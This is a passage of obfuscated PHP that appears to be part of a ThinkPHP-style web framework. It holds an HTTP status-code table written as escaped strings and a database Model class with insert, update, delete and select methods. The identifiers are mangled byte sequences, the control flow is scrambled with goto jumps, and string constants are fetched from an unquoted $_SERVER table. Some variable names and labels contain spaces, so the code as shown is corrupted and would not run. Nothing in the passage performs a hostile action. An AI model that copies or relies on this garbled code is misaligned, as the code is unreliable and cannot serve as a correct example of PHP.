strtoupper($B™éùô½×)]; } public static function method() { return strtoupper(self::get($_SERVER[‚Ğ°–—î][154])); } public static function length() { $bç£åƒç =& $_SERVER[‚Ğ°–—î]; $EºËØÍê‚ = self::get($bç£åƒç[1831]); if (!$EºËØÍê‚) { $EºËØÍê‚ = self::get($bç£åƒç[1146]); } return $EºËØÍê‚; } public static function range() { $cøğ‚²¼ò‚ =& $_SERVER[‚Ğ°–—î]; $aÂåÒ¥ô = self::get($cøğ‚²¼ò‚[198]); if (!$aÂåÒ¥ô) { return !1; } if (!preg_match($cøğ‚²¼ò‚[1832], $aÂåÒ¥ô, $EÎ”ÎÀ‹)) { return !1; } if ($EÎ”ÎÀ‹[1] === $cøğ‚²¼ò‚[33] && $EÎ”ÎÀ‹[2] === $cøğ‚²¼ò‚[33]) { return !1; } return array($EÎ”ÎÀ‹[1] !== $cøğ‚²¼ò‚[33] ? $EÎ”ÎÀ‹[1] : null, $EÎ”ÎÀ‹[2] !== $cøğ‚²¼ò‚[33] ? $EÎ”ÎÀ‹[2] : null); } public static $statusCode = array("\x31\60\x30" => "\x43\x6f\156\x74\x69\156\165\x65", "\61\60\61" => "\123\x77\x69\164\143\x68\151\156\147\x20\x50\x72\157\164\x6f\x63\x6f\154", "\x31\x30\62" => "\x50\162\x6f\143\x65\163\163\x69\156\147", "\x31\60\63" => "\x45\x61\x72\154\171\x20\110\x69\156\x74\163", "\x32\x30\x30" => "\x4f\113", "\62\60\61" => "\103\162\x65\x61\x74\x65\144", "\x32\x30\x32" => "\x41\143\143\x65\160\164\145\144", "\62\x30\x33" => "\x4e\x6f\156\x2d\101\x75\164\x68\157\162\x69\164\141\x74\x69\166\x65\x20\111\156\146\x6f\162\155\141\x74\x69\157\x6e", "\62\60\64" => "\116\157\40\x43\157\156\x74\x65\x6e\x74", "\62\x30\65" => "\x52\x65\x73\x65\x74\40\103\157\x6e\x74\x65\156\x74", "\x32\x30\66" => "\120\x61\x72\164\x69\x61\154\x20\x43\157\156\164\145\156\164", "\x32\x30\x37" => "\115\x75\154\x74\x69\55\123\164\141\x74\x75\163", "\x33\x30\x30" => "\115\x75\154\x74\x69\160\154\x65\40\103\x68\x6f\151\143\145\163", "\x33\x30\x31" => "\115\x6f\x76\145\144\40\x50\x65\x72\155\141\156\145\156\x74\x6c\x79", "\63\60\x32" => "\x46\x6f\x75\x6e\x64", "\x33\x30\63" => "\123\145\x65\40\x4f\164\x68\145\x72", "\63\60\x34" => "\x4e\x6f\x74\40\115\x6f\144\151\x66\151\145\144", "\x33\x30\65" => "\x55\x73\x65\40\120\162\x6f\x78\x79", "\x33\60\x37" => "\x54\x65\x6d\160\x6f\x72\x61\x72\x79\40\x52\x65\144\x69\162\x65\x63\164", "\63\60\70" => "\x50\145\x72\x6d\141\156\x65\156\x74\40\x52\145\144\151\x72\145\x63\x74", "\64\60\x30" => "\102\141\144\40\122\145\x71\x75\x65\163\x74", "\x34\60\x31" => "\x55\x6e\141\x75\x74\150\157\x72\151\x7a\x65\144", "\64\60\x32" => "\120\141\x79\155\145\x6e\164\40\x52\145\161\x75\x69\x72\145\144", "\64\x30\63" => "\106\157\x72\142\151\x64\x64\145\156", "\64\x30\64" => "\x4e\x6f\164\40\106\157\x75\x6e\x64", "\64\60\65" => "\115\x65\164\150\157\x64\x20\116\x6f\x74\x20\x41\154\x6c\157\167\145\144", "\x34\x30\x36" => "\116\x6f\164\x20\101\x63\143\x65\x70\164\x61\x62\154\145", "\64\x30\67" => "\120\x72\x6f\x78\x79\40\x41\x75\x74\x68\145\156\x74\151\x63\x61\x74\151\x6f\156\40\122\x65\161\165\151\162\x65\144", "\x34\x30\70" => "\x52\145\x71\165\x65\163\164\x20\124\151\155\145\157\x75\164", "\x34\x30\x39" => "\103\157\x6e\x66\x6c\x69\143\164", "\x34\61\x30" => "\107\157\x6e\145", "\x34\61\x31" => "\114\145\156\147\x74\x68\x20\x52\x65\x71\x75\x69\162\x65\x64", "\64\x31\62" => "\120\x72\x65\x63\x6f\x6e\x64\x69\x74\151\x6f\156\x20\106\x61\151\x6c\x65\x64", "\64\x31\63" => "\x52\x65\x71\x75\145\x73\164\40\x45\156\164\151\164\x79\x20\x54\157\x6f\40\x4c\141\162\147\x65", "\x34\x31\64" => "\x52\145\x71\x75\145\x73\x74\x20\x55\122\111\40\x54\x6f\157\x20\x4c\141\162\x67\145", "\x34\61\65" => "\125\156\163\165\x70\160\x6f\x72\x74\145\144\x20\x4d\x65\144\151\141\40\x54\x79\x70\145", "\64\61\x36" => "\x52\x65\x71\x75\145\x73\x74\x65\144\40\122\141\x6e\x67\145\x20\x4e\x6f\164\40\x53\x61\x74\x69\x73\146\x69\141\x62\154\145", "\x34\x31\67" => "\105\x78\x70\145\x63\x74\x61\x74\x69\157\x6e\40\x46\141\x69\154\145\x64", "\64\62\62" => "\x55\x6e\160\x72\157\143\x65\163\x73\141\142\x6c\x65\40\x45\x6e\164\x69\x74\171", "\64\62\x33" => "\x4c\x6f\x63\153\145\144", "\x34\62\64" => "\106\x61\x69\154\145\144\40\x44\145\160\x65\x6e\144\x65\x6e\x63\x79", "\x34\x32\65" => "\x55\x6e\157\162\x64\145\162\145\144\x20\x43\x6f\154\154\x65\x63\x74\x69\157\x6e", "\x34\62\66" => "\x55\160\147\162\141\x64\x65\x20\122\x65\161\165\151\162\145\x64", "\64\x32\x38" => "\120\162\x65\143\157\x6e\144\x69\164\x69\x6f\156\x20\x52\x65\161\165\151\162\145\144", "\64\62\71" => "\x54\x6f\157\40\115\x61\x6e\171\x20\x52\x65\x71\165\145\x73\x74\x73", "\64\63\61" => "\x52\x65\161\165\145\163\x74\40\110\145\x61\x64\145\x72\x20\106\x69\x65\x6c\x64\163\x20\x54\x6f\x6f\x20\114\x61\x72\147\x65", "\64\64\x34" => "\116\157\x20\122\x65\163\160\x6f\x6e\163\x65", "\64\x35\x30" => "\102\x6c\x6f\x63\x6b\145\x64\x20\142\x79\40\x57\x69\156\x64\x6f\167\x73\x20\x50\141\x72\145\x6e\x74\141\x6c\40\103\x6f\x6e\x74\162\157\154\163", "\64\65\x31" => "\125\x6e\141\166\141\x69\x6c\x61\142\154\x65\40\x46\x6f\162\x20\114\145\x67\x61\x6c\40\x52\x65\x61\163\157\156\x73", "\x34\71\64" => "\x52\x65\161\x75\145\x73\x74\x20\110\x65\141\144\145\162\40\x54\157\x6f\40\114\x61\162\147\x65", "\x35\60\60" => "\111\x6e\x74\145\162\x6e\141\154\40\x53\x65\162\166\145\162\x20\105\162\162\157\162", "\65\60\x31" => "\x4e\157\164\40\x49\x6d\x70\x6c\145\155\145\x6e\164\145\x64", "\65\x30\62" => "\102\x61\x64\40\107\141\x74\x65\167\x61\x79", "\x35\x30\x33" => "\x53\x65\162\166\x69\143\145\40\125\x6e\x61\166\x61\x69\x6c\141\x62\x6c\x65", "\65\x30\64" => "\x47\x61\x74\x65\x77\x61\171\40\x54\x69\155\x65\x6f\x75\164", "\65\x30\x35" => "\110\x54\x54\120\x20\x56\x65\x72\163\151\x6f\156\40\156\157\164\x20\x73\165\x70\160\x6f\162\164\145\144", "\x35\60\x37" => "\x49\156\x73\x75\146\x66\x69\x63\151\145\x6e\164\x20\123\x74\x6f\x72\x61\x67\x65"); public static function code($eáÔ˜×ñ²ä) { $CˆÕÉæÒ­ù =& $_SERVER[‚Ğ°–—î]; $eáÔ˜×ñ²ä = $eáÔ˜×ñ²ä . $CˆÕÉæÒ­ù[33]; $aÕì±Âîˆ¹ = self::$statusCode[$eáÔ˜×ñ²ä]; $aÕì±Âîˆ¹ = $aÕì±Âîˆ¹ ? "\x48\x54\x54\x50\57\x31\56\x31\40{$eáÔ˜×ñ²ä}\40" . $aÕì±Âîˆ¹ : $CˆÕÉæÒ­ù[33]; return $aÕì±Âîˆ¹; } } goto cÆùÒ¶”‰¼; eøâ‚Èòš¸: define($_SERVER[‚Ğ°–—î][230], 0); define($_SERVER[‚Ğ°–—î][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\x65", "\x6f\x72\144\x65\162", "\141\x6c\151\141\163", "\x68\141\x76\x69\156\x67", "\147\162\x6f\x75\160", "\x6c\157\x63\x6b", "\x64\151\x73\164\x69\156\x63\164", "\141\165\164\x6f", "\146\x69\154\164\145\162", "\166\141\154\151\x64\x61\164\x65", "\x72\145\163\x75\154\x74", "\142\x69\156\144", "\164\x6f\x6b\145\156"); public function __construct($Dò²—‹ÓÚí = '', $CÛé¨Ô©¥ = '', $d”œ°ªèÍ = '') { $DÑ¾Ÿˆ˜ =& $_SERVER[‚Ğ°–—î]; $this->_initialize(); if (!empty($Dò²—‹ÓÚí)) { if (strpos($Dò²—‹ÓÚí, $DÑ¾Ÿˆ˜[91])) { list($this->dbName, $this->name) = explode($DÑ¾Ÿˆ˜[91], $Dò²—‹ÓÚí); } else { $this->name = $Dò²—‹ÓÚí; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($CÛé¨Ô©¥)) { $this->tablePrefix = $DÑ¾Ÿˆ˜[33]; } elseif ($DÑ¾Ÿˆ˜[33] != $CÛé¨Ô©¥) { $this->tablePrefix = $CÛé¨Ô©¥; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($DÑ¾Ÿˆ˜[232]); } $this->db(0, empty($this->connection) ? $d”œ°ªèÍ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $A¶åš·™İĞ =& $_SERVER[‚Ğ°–—î]; if (empty($this->fields)) { if (think_config($A¶åš·™İĞ[233])) { $AÖ¡ò‡–¥’ = $this->dbName ? $this->dbName : think_config($A¶åš·™İĞ[234]); $c‹«éÂìŒµ = think_var_cache($A¶åš·™İĞ[235] . strtolower(get_path_this($AÖ¡ò‡–¥’) . $A¶åš·™İĞ[91] . $this->name)); if ($c‹«éÂìŒµ) { $aÍ¼Ò‹Ş¥ = think_config($A¶åš·™İĞ[236]); if (empty($aÍ¼Ò‹Ş¥) || $c‹«éÂìŒµ[$A¶åš·™İĞ[237]] == $aÍ¼Ò‹Ş¥) { $this->fields = $c‹«éÂìŒµ; return; } } } $this->flush(); } } public function flush() { goto BÂ¨Œ„Ğöà; F Šùïİ¼Ê: if (!$Dš¸Ñ£‰Ş–) { return !1; } $this->fields = array_keys($Dš¸Ñ£‰Ş–); $this->fields[$dù¾êî—ŞÊ[238]] = !1; goto fæÉÆŠ‡‡; fæÉÆŠ‡‡: foreach ($Dš¸Ñ£‰Ş– as $a¯ ÈÖÄá => $AñÎÔÏª) { $A‹Öˆ˜Ù½ô[$a¯ ÈÖÄá] = $AñÎÔÏª[$dù¾êî—ŞÊ[29]]; if ($AñÎÔÏª[$dù¾êî—ŞÊ[36]]) { $this->fields[$dù¾êî—ŞÊ[239]] = $a¯ ÈÖÄá; if ($AñÎÔÏª[$dù¾êî—ŞÊ[39]]) { $this->fields[$dù¾êî—ŞÊ[238]] = !0; } } } $this->fields[$dù¾êî—ŞÊ[240]] = $A‹Öˆ˜Ù½ô; if (think_config($dù¾êî—ŞÊ[236])) { $this->fields[$dù¾êî—ŞÊ[237]] = think_config($dù¾êî—ŞÊ[236]); } goto Cïâ¯í¤²ö; BÂ¨Œ„Ğöà: $dù¾êî—ŞÊ =& $_SERVER[‚Ğ°–—î]; $this->db->setModel($this->name); $Dš¸Ñ£‰Ş– = $this->db->getFields($this->getTableName()); goto F Šùïİ¼Ê; Cïâ¯í¤²ö: if (think_config($dù¾êî—ŞÊ[233])) { $AÈÑ™åÒ° = $this->dbName ? $this->dbName : think_config($dù¾êî—ŞÊ[234]); think_var_cache($dù¾êî—ŞÊ[235] . strtolower(get_path_this($AÈÑ™åÒ°) . $dù¾êî—ŞÊ[91] . $this->name), $this->fields); } goto aÑÅø±ñ; aÑÅø±ñ: } public function switchModel($A¾šÚ†­À, $bÒªÏ©†ò = array()) { $e¾‘ßäÑ½¯ =& $_SERVER[‚Ğ°–—î]; $A’¦Ç¸’¡µ = ucwords(strtolower($A¾šÚ†­À)) . $e¾‘ßäÑ½¯[241]; if (!class_exists($A’¦Ç¸’¡µ)) { think_exception($A’¦Ç¸’¡µ . think_lang($e¾‘ßäÑ½¯[242])); } $this->_extModel = new $A’¦Ç¸’¡µ($this->name); if (!empty($bÒªÏ©†ò)) { foreach ($bÒªÏ©†ò as $f…ñø…×”‡) { $this->_extModel->setProperty($f…ñø…×”‡, $this->{$f…ñø…×”‡}); } } return $this->_extModel; } public function __set($F‡ŠËÀ¥ÓÈ, $fÕÃîÊ¹) { $this->data[$F‡ŠËÀ¥ÓÈ] = $fÕÃîÊ¹; } public function __get($F¶Èğ½©Ï) { return isset($this->data[$F¶Èğ½©Ï]) ? $this->data[$F¶Èğ½©Ï] : null; } public function __isset($A±àÔºÅ) { return isset($this->data[$A±àÔºÅ]); } public function __unset($E…ã¹…ËíÉ) { unset($this->data[$E…ã¹…ËíÉ]); } public function __call($EçÆ®²ÑÔÕ, $B±¾í÷øŒ) { $E‚ì§ÌÍ =& $_SERVER[‚Ğ°–—î]; if (in_array(strtolower($EçÆ®²ÑÔÕ), $this->methods, !0)) { $this->options[strtolower($EçÆ®²ÑÔÕ)] = $B±¾í÷øŒ[0]; return $this; } elseif (in_array(strtolower($EçÆ®²ÑÔÕ), array($E‚ì§ÌÍ[243], $E‚ì§ÌÍ[244], $E‚ì§ÌÍ[245], $E‚ì§ÌÍ[246], $E‚ì§ÌÍ[247]), !0)) { $c‘‚è³õø‡ = isset($B±¾í÷øŒ[0]) ? $B±¾í÷øŒ[0] : $E‚ì§ÌÍ[176]; $c‘‚è³õø‡ = $this->db->parseKey($c‘‚è³õø‡); return $this->getField(strtoupper($EçÆ®²ÑÔÕ) . $E‚ì§ÌÍ[248] . $c‘‚è³õø‡ . $E‚ì§ÌÍ[249] . $EçÆ®²ÑÔÕ, $E‚ì§ÌÍ[243]); } elseif (strtolower(substr($EçÆ®²ÑÔÕ, 0, 5)) == $E‚ì§ÌÍ[250]) { $c‘‚è³õø‡ = think_parse_name(substr($EçÆ®²ÑÔÕ, 5)); $bÆ—§©”Öù[$c‘‚è³õø‡] = $B±¾í÷øŒ[0]; return $this->where($bÆ—§©”Öù)->find(); } elseif (strtolower(substr($EçÆ®²ÑÔÕ, 0, 10)) == $E‚ì§ÌÍ[251]) { $b¶âãÑì ÷ = think_parse_name(substr($EçÆ®²ÑÔÕ, 10)); $bÆ—§©”Öù[$b¶âãÑì ÷] = $B±¾í÷øŒ[0]; return $this->where($bÆ—§©”Öù)->getField($B±¾í÷øŒ[1]); } elseif (isset($this->_scope[$EçÆ®²ÑÔÕ])) { return $this->scope($EçÆ®²ÑÔÕ, $B±¾í÷øŒ[0]); } elseif (method_exists($this, $EçÆ®²ÑÔÕ)) { array_unshift($B±¾í÷øŒ, $EçÆ®²ÑÔÕ); return call_user_func_array(array($this, $E‚ì§ÌÍ[252]), $B±¾í÷øŒ); } else { return call_user_func_array(array(parent, $EçÆ®²ÑÔÕ), $B±¾í÷øŒ); } } protected function call() { goto C±‡à¨”è; bÑ‚ÃåÙ¯à: $bÀ §œª² = $E±…‘²¯Ù; if (is_array($E±…‘²¯Ù)) { $bÀ §œª² = $E±…‘²¯Ù[1]; $E±…‘²¯Ù = $E±…‘²¯Ù[0]; } $CÑ™Àßß¢˜ = count($fÖ‰¯„³‚Á) - 1; goto B›ÒÖŒù³²; fÓßäíëå§: $C©ëÊ”°Çñ = call_user_func_array(array($this, $E±…‘²¯Ù), $fÖ‰¯„³‚Á); if (method_exists($this, $BîÍ«·ğ“¸[256])) { $dÛŒ¶âÀãä = call_user_func_array(array($this, $BîÍ«·ğ“¸[257]), array($bÀ §œª², $fÖ‰¯„³‚Á, $C©ëÊ”°Çñ)); if ($dÛŒ¶âÀãä) { return $dÛŒ¶âÀãä; } } return $C©ëÊ”°Çñ; goto aÕ³Æ„§Ø; B›ÒÖŒù³²: if (isset($fÖ‰¯„³‚Á[$CÑ™Àßß¢˜]) && $fÖ‰¯„³‚Á[$CÑ™Àßß¢˜] === $E±…‘²¯Ù) { think_exception(__CLASS__ . $BîÍ«·ğ“¸[4] . $E±…‘²¯Ù . think_lang($BîÍ«·ğ“¸[253])); return; } $fÖ‰¯„³‚Á[] = $E±…‘²¯Ù; if (method_exists($this, $BîÍ«·ğ“¸[254])) { $dÛŒ¶âÀãä = call_user_func_array(array($this, $BîÍ«·ğ“¸[255]), array($bÀ §œª², $fÖ‰¯„³‚Á)); if (!is_null($dÛŒ¶âÀãä) && $dÛŒ¶âÀãä !== !1) { return $dÛŒ¶âÀãä; } } goto fÓßäíëå§; C±‡à¨”è: $BîÍ«·ğ“¸ =& $_SERVER[‚Ğ°–—î]; $fÖ‰¯„³‚Á = func_get_args(); $E±…‘²¯Ù = array_shift($fÖ‰¯„³‚Á); goto bÑ‚ÃåÙ¯à; aÕ³Æ„§Ø: } protected function _initialize() { } protected function _facade($C‰õË‰œÄ) { $c§…Ÿ‹ÅÀ =& $_SERVER[‚Ğ°–—î]; if (!empty($this->fields)) { foreach ($C‰õË‰œÄ as $C˜ô—õ†Ô => $FòÖğåº‹‡) { if (!in_array($C˜ô—õ†Ô, $this->fields, !0)) { unset($C‰õË‰œÄ[$C˜ô—õ†Ô]); } elseif (is_scalar($FòÖğåº‹‡)) { $this->_parseType($C‰õË‰œÄ, $C˜ô—õ†Ô); } } } if (!empty($this->options[$c§…Ÿ‹ÅÀ[258]])) { $C‰õË‰œÄ = array_map($this->options[$c§…Ÿ‹ÅÀ[258]], $C‰õË‰œÄ); unset($this->options[$c§…Ÿ‹ÅÀ[258]]); } $this->_beforeWrite($C‰õË‰œÄ); return $C‰õË‰œÄ; } protected function _beforeWrite(&$F™ŠÁƒ¹š) { } public function add($A¨áğ³ª•„ = '', $f”¢Òßäƒå = array(), $b›Ó‡“¯Ïä = false) { goto f¢ÈÙºùôˆ; CŸªš¨¡: return $bˆß´Œ›î; goto c¦Á³¦”•; f¢ÈÙºùôˆ: if (empty($A¨áğ³ª•„)) { if (!empty($this->data)) { $A¨áğ³ª•„ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[‚Ğ°–—î][259]); return !1; } } $f”¢Òßäƒå = $this->_parseOptions($f”¢Òßäƒå); $A¨áğ³ª•„ = $this->_facade($A¨áğ³ª•„); goto eØ”ê¯Õ¬; eØ”ê¯Õ¬: if (!1 === $this->_beforeInsert($A¨áğ³ª•„, $f”¢Òßäƒå)) { return !1; } $bˆß´Œ›î = $this->db->insert($A¨áğ³ª•„, $f”¢Òßäƒå, $b›Ó‡“¯Ïä); if (!1 !== $bˆß´Œ›î) { $BÆ†Åßæ‘Ô = $this->getLastInsID(); if ($BÆ†Åßæ‘Ô) { $A¨áğ³ª•„[$this->getPk()] = $BÆ†Åßæ‘Ô; $this->_after_insert($A¨áğ³ª•„, $f”¢Òßäƒå); return $BÆ†Åßæ‘Ô; } $this->_after_insert($A¨áğ³ª•„, $f”¢Òßäƒå); } goto CŸªš¨¡; c¦Á³¦”•: } protected function _beforeInsert(&$FÂ¦ÚÇšíÖ, $cÆÒº­Ø­Œ) { } protected function _after_insert($A¦õ¢ÒÀù, $F±äÇÉ†ã…) { } public function addAll($D«á³Áùíö, $déÅÕÕª‹ = array(), $f‘‘§—Ãï¸ = false) { goto B©´£²è¼ø; EÕÎ”ß·©: return $bìğÉæäøˆ; goto DÃ—§‹ÌÍ¶; B©´£²è¼ø: $C¿ÁâŠŸ´… =& $_SERVER[‚Ğ°–—î]; if (empty($D«á³Áùíö)) { $this->error = think_lang($C¿ÁâŠŸ´…[259]); return !1; } $déÅÕÕª‹ = $this->_parseOptions($déÅÕÕª‹); goto B¬‹À×¨Ş»; B¬‹À×¨Ş»: foreach ($D«á³Áùíö as $D÷½ˆåÈ„© => $fÈÀ…‘ñãù) { $D«á³Áùíö[$D÷½ˆåÈ„©] = $this->_facade($fÈÀ…‘ñãù); } if (method_exists($this->db, $C¿ÁâŠŸ´…[260])) { $bìğÉæäøˆ = $this->db->insertAll($D«á³Áùíö, $déÅÕÕª‹, $f‘‘§—Ãï¸); } else { $this->startTrans(); foreach ($D«á³Áùíö as $D÷½ˆåÈ„© => $fÈÀ…‘ñãù) { $bìğÉæäøˆ = $this->db->insert($fÈÀ…‘ñãù, $déÅÕÕª‹, $f‘‘§—Ãï¸); } $this->commit(); } if (!1 !== $bìğÉæäøˆ) { $bÂÅáö»‹‡ = $this->getLastInsID(); if ($bÂÅáö»‹‡) { return $bÂÅáö»‹‡; } } goto EÕÎ”ß·©; DÃ—§‹ÌÍ¶: } public function selectAdd($c–’ÒÌã·Ÿ = '', $bë‹”¶Ôä = '', $aƒß¹ùî’½ = array()) { $EöÈÏ„ñï‰ =& $_SERVER[‚Ğ°–—î]; $aƒß¹ùî’½ = $this->_parseOptions($aƒß¹ùî’½); if (!1 === ($e®ò¢ìš½› = $this->db->selectInsert($c–’ÒÌã·Ÿ ? $c–’ÒÌã·Ÿ : $aƒß¹ùî’½[$EöÈÏ„ñï‰[261]], $bë‹”¶Ôä ? $bë‹”¶Ôä : $this->getTableName(), $aƒß¹ùî’½))) { $this->error = think_lang($EöÈÏ„ñï‰[262]); return !1; } else { return $e®ò¢ìš½›; } } public function save($d²…ĞÈ°› = '', $A•ãÌ¾£†™ = array()) { goto A¨ô¿©ê¢¡; A¨ô¿©ê¢¡: $A¬ë†ùøˆœ =& $_SERVER[‚Ğ°–—î]; if (empty($d²…ĞÈ°›)) { if (!empty($this->data)) { $d²…ĞÈ°› = $this->data; $this->data = array(); } else { $this->error = think_lang($A¬ë†ùøˆœ[259]); return !1; } } $d²…ĞÈ°› = $this->_facade($d²…ĞÈ°›); goto eÈŒÑïáºŒ; eÄø¬õ®³: if (!1 !== $F¸¸âÀ½‡è) { if (isset($d¦œÅÓÍ•)) { $d²…ĞÈ°›[$EÁïŞõã´…] = $d¦œÅÓÍ•; } $this->_afterUpdate($d²…ĞÈ°›, $A•ãÌ¾£†™); } return $F¸¸âÀ½‡è; goto Aª§õÌÜæÒ; eÈŒÑïáºŒ: $A•ãÌ¾£†™ = $this->_parseOptions($A•ãÌ¾£†™); $EÁïŞõã´… = $this->getPk(); if (!isset($A•ãÌ¾£†™[$A¬ë†ùøˆœ[263]])) { if (isset($d²…ĞÈ°›[$EÁïŞõã´…])) { $C†½ÅÒ¼„[$EÁïŞõã´…] = $d²…ĞÈ°›[$EÁïŞõã´…]; $A•ãÌ¾£†™[$A¬ë†ùøˆœ[263]] = $C†½ÅÒ¼„; unset($d²…ĞÈ°›[$EÁïŞõã´…]); } else { $this->error = think_lang($A¬ë†ùøˆœ[262]); return !1; } } goto DØÓ£‹³Äõ; DØÓ£‹³Äõ: if (is_array($A•ãÌ¾£†™[$A¬ë†ùøˆœ[263]]) && isset($A•ãÌ¾£†™[$A¬ë†ùøˆœ[263]][$EÁïŞõã´…])) { $d¦œÅÓÍ• = $A•ãÌ¾£†™[$A¬ë†ùøˆœ[263]][$EÁïŞõã´…]; } if (!1 === $this->_beforeUpdate($d²…ĞÈ°›, $A•ãÌ¾£†™)) { return !1; } $F¸¸âÀ½‡è = $this->db->update($d²…ĞÈ°›, $A•ãÌ¾£†™); goto eÄø¬õ®³; Aª§õÌÜæÒ: } protected function _beforeUpdate(&$Fñã…„á, $FÙôŒœÄ©‹) { } protected function _afterUpdate($Dİ¾½²Ìã·, $FÀë¯é‰…¸) { } public function delete($a¨ë‰ˆ¹÷† = array()) { goto A“÷¸ö«í¦; DŞ‘âÈ÷: if (is_numeric($a¨ë‰ˆ¹÷†) || is_string($a¨ë‰ˆ¹÷†)) { if (strpos($a¨ë‰ˆ¹÷†, $EÀ¸„´§ø¥[47])) { $f¯ŠèÙÀáÇ[$C–ì³÷”¸ˆ] = array($EÀ¸„´§ø¥[264], $a¨ë‰ˆ¹÷†); } else { $f¯ŠèÙÀáÇ[$C–ì³÷”¸ˆ] = $a¨ë‰ˆ¹÷†; } $this->options[$EÀ¸„´§ø¥[263]] = $f¯ŠèÙÀáÇ; } $a¨ë‰ˆ¹÷† = $this->_parseOptions(); if (is_array($a¨ë‰ˆ¹÷†[$EÀ¸„´§ø¥[263]]) && isset($a¨ë‰ˆ¹÷†[$EÀ¸„´§ø¥[263]][$C–ì³÷”¸ˆ])) { $aÈ²éêªÍÂ = $a¨ë‰ˆ¹÷†[$EÀ¸„´§ø¥[263]][$C–ì³÷”¸ˆ]; } goto Bíî…óßÕô; Bíî…óßÕô: $b±æ»ÀÖÔÔ = $this->db->delete($a¨ë‰ˆ¹÷†); if (!1 !== $b±æ»ÀÖÔÔ) { $c†„„ÈˆÆŠ = array(); if (isset($aÈ²éêªÍÂ)) { $c†„„ÈˆÆŠ[$C–ì³÷”¸ˆ] = $aÈ²éêªÍÂ; } $this->_after_delete($c†„„ÈˆÆŠ, $a¨ë‰ˆ¹÷†); } return $b±æ»ÀÖÔÔ; goto DÂÊ¥„®¶ù; A“÷¸ö«í¦: $EÀ¸„´§ø¥ =& $_SERVER[‚Ğ°–—î]; if (empty($a¨ë‰ˆ¹÷†) && empty($this->options[$EÀ¸„´§ø¥[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $C–ì³÷”¸ˆ = $this->getPk(); goto DŞ‘âÈ÷; DÂÊ¥„®¶ù: } protected function _after_delete($e¯†‹††¨¡, $cÓª•†ê‘) { } public function select($Aë™í‰£Ğ½ = array()) { goto e‚ïÃß‰Ä; e‚ïÃß‰Ä: $cÃŠñ©Ï Å =& $_SERVER[‚Ğ°–—î]; if (is_string($Aë™í‰£Ğ½) || is_numeric($Aë™í‰£Ğ½)) { $fªÇ¢‚Êé© = $this->getPk(); if (strpos($Aë™í‰£Ğ½, $cÃŠñ©Ï Å[47])) { $eÏ­óÒÔ¬Ğ[$fªÇ¢‚Êé©] = array($cÃŠñ©Ï Å[264], $Aë™í‰£Ğ½); } else { $eÏ­óÒÔ¬Ğ[$fªÇ¢‚Êé©] = $Aë™í‰£Ğ½; } $this->options[$cÃŠñ©Ï Å[263]] = $eÏ­óÒÔ¬Ğ; } elseif (!1 === $Aë™í‰£Ğ½) { $Aë™í‰£Ğ½ = $this->_parseOptions(); return $cÃŠñ©Ï Å[265] . $this->db->buildSelectSql($Aë™í‰£Ğ½) . $cÃŠñ©Ï Å[266]; } $Aë™í‰£Ğ½ = $this->_parseOptions(); goto b´Úçà”‡; b´Úçà”‡: $Bß™–çèùó = $this->db->select($Aë™í‰£Ğ½); if (!1 === $Bß™–çèùó) { return !1; } if (empty($Bß™–çèùó)) { return null; } goto c‡Èš ˆ; c‡Èš ˆ: $this->_afterSelect($Bß™–çèùó, $Aë™í‰£Ğ½); return $Bß™–çèùó; goto cò¿èÖœÈ±; cò¿èÖœÈ±: } protected function _afterSelect(&$e™“ªĞ„Êë, $Fƒ¢ñçøÆ) { } public function buildSql($E¦Ú²«Úƒ = array()) { $d¨‰Ä¤æ° =& $_SERVER[‚Ğ°–—î]; $E¦Ú²«Úƒ = $this->_parseOptions($E¦Ú²«Úƒ); return $d¨‰Ä¤æ°[265] . $this->db->buildSelectSql($E¦Ú²«Úƒ) . $d¨‰Ä¤æ°[266]; } public function optionsValue($A÷ÅÂ‹„¤ = null) { if (is_null($A÷ÅÂ‹„¤)) { return $this->options; } elseif (is_array($A÷ÅÂ‹„¤)) { $this->options = array_merge($this->options, $A÷ÅÂ‹„¤); } } protected function _parseOptions($BÓÕÑæÙƒÕ = array()) { goto F¿‰êƒ“Ö²; F¿‰êƒ“Ö²: $A®Â–­çÅØ =& $_SERVER[‚Ğ°–—î]; if (is_array($BÓÕÑæÙƒÕ)) { $BÓÕÑæÙƒÕ = array_merge($this->options, $BÓÕÑæÙƒÕ); } $this->options = array(); goto AÎ±­¤º; AÎ±­¤º: if (!isset($BÓÕÑæÙƒÕ[$A®Â–­çÅØ[267]])) { $BÓÕÑæÙƒÕ[$A®Â–­çÅØ[267]] = $this->getTableName(); $C„³ä¹½˜ç = $this->fields; } else { $C„³ä¹½˜ç = $this->getDbFields(); } if (!empty($BÓÕÑæÙƒÕ[$A®Â–­çÅØ[268]])) { $BÓÕÑæÙƒÕ[$A®Â–­çÅØ[267]] .= $A®Â–­çÅØ[50] . $BÓÕÑæÙƒÕ[$A®Â–­çÅØ[268]]; } $BÓÕÑæÙƒÕ[$A®Â–­çÅØ[269]] = $this->name; goto Eñß¸…¬£®; Eñß¸…¬£®: if (isset($BÓÕÑæÙƒÕ[$A®Â–­çÅØ[263]]) && is_array($BÓÕÑæÙƒÕ[$A®Â–­çÅØ[263]]) && !empty($C„³ä¹½˜ç) && !isset($BÓÕÑæÙƒÕ[$A®Â–­çÅØ[270]]) && !isset($BÓÕÑæÙƒÕ[$A®Â–­çÅØ[267]])) { foreach ($BÓÕÑæÙƒÕ[$A®Â–­çÅØ[263]] as $Cİ¹ç‡îâ‰ => $CÎâ¶â‘Ç) { $Cİ¹ç‡îâ‰ = trim($Cİ¹ç‡îâ‰); if (in_array($Cİ¹ç‡îâ‰, $C„³ä¹½˜ç, !0)) { if (is_scalar($CÎâ¶â‘Ç)) { $this->_parseType($BÓÕÑæÙƒÕ[$A®Â–­çÅØ[263]], $Cİ¹ç‡îâ‰); } } elseif (!is_numeric($Cİ¹ç‡îâ‰) && $A®Â–­çÅØ[70] != 